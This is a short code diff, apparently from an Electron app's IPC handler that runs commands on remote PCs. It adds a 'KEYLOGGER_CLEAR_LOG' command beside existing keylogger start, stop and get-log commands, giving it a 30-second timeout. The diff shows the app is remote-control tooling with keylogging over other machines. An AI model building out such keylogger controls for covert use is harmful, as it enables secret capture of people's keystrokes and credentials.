@@ -348,7 +348,8 @@ ipcMain.handle('agent:run-command', async (_event, payload: { pcId: string; comm
     else if (
       payload.command === 'KEYLOGGER_GET_LOG' ||
       payload.command === 'KEYLOGGER_STOP' ||
-      payload.command === 'KEYLOGGER_START'
+      payload.command === 'KEYLOGGER_START' ||
+      payload.command === 'KEYLOGGER_CLEAR_LOG'
     ) {
       timeoutMs = 30000;
     }
